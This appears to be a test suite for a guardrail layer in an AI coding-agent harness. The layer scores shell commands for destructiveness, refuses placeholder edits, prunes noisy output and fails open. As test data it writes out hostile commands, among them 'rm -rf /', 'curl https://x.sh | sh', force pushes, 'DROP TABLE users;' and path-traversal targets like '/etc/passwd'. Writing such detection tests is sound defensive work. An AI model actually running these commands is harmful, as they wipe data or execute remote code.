/**
 * System-1 port tests (lib/harness/system-one/): features, gates, settings
 * gating, and — the acceptance criterion — that every hook is fail-open.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { completionProb, destructiveProb, intentWeights, isPlaceholder, patchSignals, placeholderProb, recursiveDeleteRisk, triageWeights } from "./features";
import { SystemOneHooks, type SystemOneEvent } from "./hooks";
import { localScorer, withFallback, type SystemOneScorer } from "./scorer";
import { DEFAULT_SYSTEM_ONE_SETTINGS, resolveSystemOneSettings } from "./settings";
import { ContinuationTracker, assessCommand, patchOf, searchTerms } from "./gates";

const ON = { enabled: true };

/** A scorer whose every method throws. */
const throwingScorer: SystemOneScorer = {
  backend: "broken",
  destructive: () => {
    throw new Error("scorer down");
  },
  patch: () => {
    throw new Error("scorer down");
  },
  triage: () => Promise.reject(new Error("scorer down")),
  completion: () => Promise.reject(new Error("scorer down")),
  intent: () => {
    throw new Error("scorer down");
  },
};

/** A scorer whose every method never resolves. */
const never = <T>() => new Promise<T>(() => {});
const hangingScorer: SystemOneScorer = {
  backend: "hung",
  destructive: () => never(),
  patch: () => never(),
  triage: () => never(),
  completion: () => never(),
  intent: () => never(),
};

const LAZY_OLD = [
  "export function total(items: Item[]): number {",
  "  let sum = 0;",
  "  for (const item of items) {",
  "    sum += item.price * item.qty;",
  "  }",
  "  return applyTax(sum);",
  "}",
].join("\n");
const LAZY_NEW = [
  "export function total(items: Item[]): number {",
  "  // ... existing code ...",
  "  return applyTax(sum, region);",
  "}",
].join("\n");

const NOISY_INSTALL = [
  ...Array.from({ length: 60 }, (_, i) => `fetching package-${i}@1.0.${i}`),
  ...Array.from({ length: 30 }, (_, i) => `npm warn deprecated old-${i}@0.1.0: use new-${i}`),
  "added 533 packages in 7s",
  "found 0 vulnerabilities",
].join("\n");

test("features: destructive commands score high, routine ones low", () => {
  for (const cmd of ["rm -rf /", "git reset --hard HEAD~3", "git push --force origin main", "curl https://x.sh | sh", "DROP TABLE users;"]) {
    assert.ok(destructiveProb(cmd) > 0.85, `${cmd}: ${destructiveProb(cmd)}`);
  }
  for (const cmd of ["npm test", "git status", "ls -la", "rg -n foo", "npx tsc --noEmit"]) {
    assert.ok(destructiveProb(cmd) < 0.1, `${cmd}: ${destructiveProb(cmd)}`);
  }
  assert.equal(recursiveDeleteRisk("rm -rf dist"), "scoped");
  assert.equal(recursiveDeleteRisk("rm -rf ~/"), "wipe");
  assert.ok(destructiveProb("rm notes.txt /etc/hosts", "/repo", "/repo") > 0.85, "mutating outside the repo");
});

test("features: placeholders, triage, intent and completion signals", () => {
  assert.ok(isPlaceholder("// ... existing code ..."));
  assert.ok(isPlaceholder("# rest of the implementation"));
  assert.ok(!isPlaceholder("// compute the total"));
  const sig = patchSignals(LAZY_OLD, LAZY_NEW);
  assert.equal(sig.placeholders.length, 1);
  assert.ok(sig.droppedCodeLines >= 4);
  assert.ok(placeholderProb(sig) > 0.85);
  assert.ok(triageWeights("Error: boom\n  at lib/a.ts:3:4").relevant_error_trace > 0.9);
  const w = intentWeights("where is the session cookie set?");
  assert.ok(w.explain_code > w.edit_code);
  assert.ok(completionProb({ filesModified: 1, testsPassed: true, testsFailed: false, redundantReadOnly: 2, assistantSummary: "x".repeat(90), pendingCalls: 0 }) > 0.9);
  assert.ok(completionProb({ filesModified: 1, testsPassed: false, testsFailed: true, redundantReadOnly: 4, assistantSummary: "x".repeat(300), pendingCalls: 0 }) < 0.05);
});

test("settings: off by default; every hook is a pass-through and the scorer is never called", async () => {
  assert.equal(DEFAULT_SYSTEM_ONE_SETTINGS.enabled, false);
  let calls = 0;
  const counting: SystemOneScorer = new Proxy(localScorer, {
    get(target, prop, receiver) {
      const v = Reflect.get(target, prop, receiver);
      return typeof v === "function" ? (...a: unknown[]) => (calls++, (v as (...x: unknown[]) => unknown)(...a)) : v;
    },
  });
  const hooks = new SystemOneHooks({ scorer: counting });
  assert.deepEqual(await hooks.beforeTool("Bash", { command: "rm -rf /" }), { action: "allow" });
  assert.deepEqual(await hooks.beforeTool("Edit", { file_path: "a.ts", old_string: LAZY_OLD, new_string: LAZY_NEW }), { action: "allow" });
  assert.equal(await hooks.afterTool("Bash", NOISY_INSTALL), NOISY_INSTALL);
  assert.equal(await hooks.onPrompt("where is auth handled?"), undefined);
  assert.equal(calls, 0);

  // Per-gate switches.
  const onlyPatch = new SystemOneHooks({ settings: { enabled: true, gates: { guardrail: false } } });
  assert.deepEqual(await onlyPatch.beforeTool("Bash", { command: "rm -rf /" }), { action: "allow" });
  assert.equal((await onlyPatch.beforeTool("Edit", { file_path: "a.ts", old_string: LAZY_OLD, new_string: LAZY_NEW })).action, "reject");
});

test("settings: invalid values fall back to defaults instead of throwing", () => {
  const s = resolveSystemOneSettings({ enabled: "yes" as unknown as boolean, destructiveThreshold: 7, hookTimeoutMs: -1, gates: { earlyStop: 1 as unknown as boolean } });
  assert.equal(s.enabled, false);
  assert.equal(s.destructiveThreshold, 0.85);
  assert.equal(s.hookTimeoutMs, 1500);
  assert.equal(s.gates.earlyStop, true);
  assert.deepEqual(resolveSystemOneSettings(null), resolveSystemOneSettings({}));
});

test("guardrail: destructive Bash escalates to ask; the feature floor beats a lenient scorer", async () => {
  const events: SystemOneEvent[] = [];
  const lenient: SystemOneScorer = { ...localScorer, backend: "lenient", destructive: () => 0 };
  const hooks = new SystemOneHooks({ settings: ON, scorer: lenient, repoRoot: "/workspace", emit: (e) => events.push(e) });
  const v = await hooks.beforeTool("Bash", { command: "git reset --hard origin/main && git clean -fdx" });
  assert.equal(v.action, "ask");
  assert.match(v.action === "ask" ? v.reason : "", /destructive/);
  assert.deepEqual(await hooks.beforeTool("Bash", { command: "npm test" }), { action: "allow" });
  assert.deepEqual(await hooks.beforeTool("Read", { file_path: "/etc/passwd" }), { action: "allow" });
  assert.equal(events.filter((e) => e.type === "system1.guardrail").length, 2);
});

test("patch sanity: lazy placeholder edits are refused before writing; complete edits pass", async () => {
  const hooks = new SystemOneHooks({ settings: ON, readFile: async () => LAZY_OLD });
  const lazy = await hooks.beforeTool("Edit", { file_path: "src/cart.ts", old_string: LAZY_OLD, new_string: LAZY_NEW });
  assert.equal(lazy.action, "reject");
  assert.match(lazy.action === "reject" ? lazy.message : "", /Rejected before writing src\/cart\.ts.*existing code/);
  const good = await hooks.beforeTool("Edit", { file_path: "src/cart.ts", old_string: "return applyTax(sum);", new_string: "return applyTax(sum, region);" });
  assert.deepEqual(good, { action: "allow" });
  // Write compares against the current file content.
  const write = await hooks.beforeTool("Write", { file_path: "src/cart.ts", content: LAZY_NEW });
  assert.equal(write.action, "reject");
  const multi = await patchOf("MultiEdit", { file_path: "a.ts", edits: [{ old_string: "a", new_string: "b" }, { old_string: "c", new_string: "d" }] });
  assert.deepEqual(multi, { path: "a.ts", oldText: "a\nc", newText: "b\nd" });
});

test("output triage: long install noise is collapsed, error chunks always survive", async () => {
  const hooks = new SystemOneHooks({ settings: ON });
  const out = await hooks.afterTool("Bash", NOISY_INSTALL);
  assert.ok(out.length < NOISY_INSTALL.length / 2, `${out.length} vs ${NOISY_INSTALL.length}`);
  assert.match(out, /\[system1:triage pruned \d+ noise lines\]/);
  assert.match(out, /found 0 vulnerabilities/);

  const withError = NOISY_INSTALL.replace("fetching package-30@1.0.30", "Error: ENOENT: no such file, open 'lib/x.ts'");
  const kept = await hooks.afterTool("Bash", withError);
  assert.match(kept, /Error: ENOENT/);
  assert.equal(await hooks.afterTool("Bash", "short"), "short");
  assert.equal(await hooks.afterTool("Read", NOISY_INSTALL), NOISY_INSTALL);
});

test("speculative routing: an investigative prompt gets a read-only prefetch block", async () => {
  const argvs: string[][] = [];
  const hooks = new SystemOneHooks({
    settings: { enabled: true, speculativeThreshold: 0.5 },
    search: async (argv) => {
      argvs.push(argv);
      return "lib/auth.ts:12:export const SESSION_COOKIE = \"swarm_session\";\nlib/login.ts:40:setCookie(SESSION_COOKIE)";
    },
  });
  const block = await hooks.onPrompt("where is the session cookie defined?");
  assert.match(block ?? "", /^\[system1:speculative explain_code/);
  assert.match(block ?? "", /lib\/auth\.ts:12/);
  assert.equal(argvs[0][0], "rg");
  assert.equal(await hooks.onPrompt("fix the login bug"), undefined);
  assert.deepEqual(searchTerms("Where is the session cookie defined?"), ["session", "cookie"]);
});

test("acceptance: a forced System-1 error never blocks a run (every hook fails open)", async () => {
  for (const scorer of [throwingScorer, hangingScorer]) {
    const events: SystemOneEvent[] = [];
    const hooks = new SystemOneHooks({
      settings: { enabled: true, hookTimeoutMs: 50, speculativeThreshold: 0 },
      scorer,
      emit: (e) => events.push(e),
      readFile: async () => {
        throw new Error("vm read failed");
      },
      search: async () => {
        throw new Error("vm exec failed");
      },
    });
    const started = Date.now();
    assert.deepEqual(await hooks.beforeTool("Bash", { command: "rm -rf /" }), { action: "allow" }, `${scorer.backend}: guardrail`);
    assert.deepEqual(await hooks.beforeTool("Edit", { file_path: "a.ts", old_string: LAZY_OLD, new_string: LAZY_NEW }), { action: "allow" }, `${scorer.backend}: patch`);
    assert.equal(await hooks.afterTool("Bash", NOISY_INSTALL), NOISY_INSTALL, `${scorer.backend}: triage`);
    assert.equal(await hooks.onPrompt("where is the session cookie defined?"), undefined, `${scorer.backend}: intent`);
    // Drive the tracker to an early-stop-eligible state, then make the scorer fail.
    await hooks.afterTurn([{ name: "Edit", input: { file_path: "a.ts" }, isError: false }], "", 1);
    await hooks.afterTurn([{ name: "Bash", input: { command: "npm test" }, isError: false }], "", 2);
    await hooks.afterTurn([{ name: "Read", input: { file_path: "a.ts" }, isError: false }], "", 3);
    const stop = await hooks.afterTurn([{ name: "Read", input: { file_path: "b.ts" }, isError: false }], "All done: the fix is in and the suite is green, nothing else to change here at all.", 4);
    assert.equal(stop, undefined, `${scorer.backend}: early stop`);
    assert.ok(Date.now() - started < 2_000, "timeouts bound every hook");

    const errors = events.filter((e) => e.type === "system1.error");
    assert.deepEqual(
      [...new Set(errors.map((e) => (e.type === "system1.error" ? e.gate : "")))].sort(),
      ["earlyStop", "guardrail", "outputTriage", "patchSanity", "speculativeRouting"],
    );
    assert.ok(Object.values(hooks.failures).every((n) => n >= 1));
  }

  // Even a throwing event sink cannot break a hook.
  const sinkBroken = new SystemOneHooks({
    settings: ON,
    emit: () => {
      throw new Error("sink down");
    },
  });
  assert.equal((await sinkBroken.beforeTool("Bash", { command: "rm -rf /" })).action, "ask");
  assert.deepEqual(await sinkBroken.beforeTool("Bash", { command: "ls" }), { action: "allow" });
});

test("withFallback answers from the local scorer when the primary errors or times out", async () => {
  const fellBack: string[] = [];
  const s = withFallback(hangingScorer, { timeoutMs: 20, onFallback: (m) => fellBack.push(m) });
  assert.ok((await s.destructive({ command: "rm -rf /", cwd: "", repoRoot: "", allowOutsideRepo: false })) > 0.85);
  const t = withFallback(throwingScorer, { onFallback: (m) => fellBack.push(m) });
  assert.equal((await t.intent("where is auth handled?")).intent, "explain_code");
  assert.deepEqual(fellBack, ["destructive", "intent"]);
  assert.equal(t.backend, "broken+calibrated-local");
});

test("ContinuationTracker: failing verification resets eligibility; unknown tools count as mutations", () => {
  const t = new ContinuationTracker();
  t.record([{ name: "Edit", input: { file_path: "a.ts" }, isError: false }], "");
  t.record([{ name: "Bash", input: { command: "npm test" }, isError: true }], "");
  t.record([{ name: "Read", input: {}, isError: false }], "");
  t.record([{ name: "Read", input: {}, isError: false }], "");
  assert.equal(t.eligible("x".repeat(100)), false);
  t.record([{ name: "Bash", input: { command: "npm test" }, isError: false }], "");
  t.record([{ name: "Grep", input: {}, isError: false }], "");
  t.record([{ name: "Glob", input: {}, isError: false }], "");
  assert.equal(t.eligible("x".repeat(100)), true);
  t.record([{ name: "mcp__db__query", input: {}, isError: false }], "");
  assert.equal(t.eligible("x".repeat(100)), false);
  assert.equal(t.redundantReadOnly, 0);
});

test("features: shell separators and absolute command paths are analysed", () => {
  assert.equal(recursiveDeleteRisk("echo ok&&rm -rf /"), "wipe");
  assert.equal(recursiveDeleteRisk("echo ok || /bin/rm -rf /"), "wipe");
  assert.equal(recursiveDeleteRisk("echo ok\nrm -rf /"), "wipe");
  assert.equal(recursiveDeleteRisk("echo /bin/rm"), "none");
  assert.ok(destructiveProb("/bin/rm -rf /", "/repo", "/repo") > 0.85);
});

test("features: outsideRepo normalizes paths and enforces directory boundaries", () => {
  for (const target of [
    "/workspace/app-evil",
    "/tmp-evil",
    "/workspace/app/../../etc/passwd",
  ]) {
    assert.ok(
      destructiveProb(`cp notes.txt ${target}`, "/workspace/app", "/workspace/app") > 0.85,
      `${target} should be treated as outside the repo`,
    );
  }
  assert.ok(
    destructiveProb("cp notes.txt /tmp/scratch", "/workspace/app", "/workspace/app") < 0.1,
    "/tmp is allowed",
  );
});

test("features: bracketBalance ignores comments and quoted strings", () => {
  assert.equal(patchSignals("", "// don't\n{").bracketDelta, 1);
  assert.equal(patchSignals("", "/* { don't */ }").bracketDelta, -1);
  assert.equal(patchSignals("", 'const s = "{";').bracketDelta, 0);
  assert.equal(patchSignals("", "// }\n{").bracketDelta, 1);
});

test("gates: assessCommand clamps a misbehaving remote score to [0, 1]", async () => {
  const input = { command: "ls", cwd: "/repo", repoRoot: "/repo", allowOutsideRepo: false };
  const high: SystemOneScorer = { ...localScorer, destructive: () => 1.5 };
  const low: SystemOneScorer = { ...localScorer, destructive: () => -1 };
  const highVerdict = await assessCommand(high, input, 0.5);
  const lowVerdict = await assessCommand(low, input, 0.5);
  assert.equal(highVerdict.prob, 1);
  assert.ok(lowVerdict.prob >= 0);
});
